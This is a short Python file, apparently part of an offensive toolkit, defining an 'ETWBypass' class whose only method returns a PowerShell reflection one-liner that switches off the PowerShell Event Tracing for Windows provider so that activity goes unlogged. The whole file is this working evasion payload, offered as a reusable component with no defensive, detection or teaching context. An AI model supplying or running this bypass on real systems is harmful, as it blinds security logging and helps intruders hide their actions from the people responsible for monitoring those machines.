#!/usr/bin/env python3

class ETWBypass:
    """ETW (Event Tracing for Windows) bypass techniques"""
    
    @staticmethod
    def get_bypass():
        """ETW bypass to prevent logging"""
        return "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)"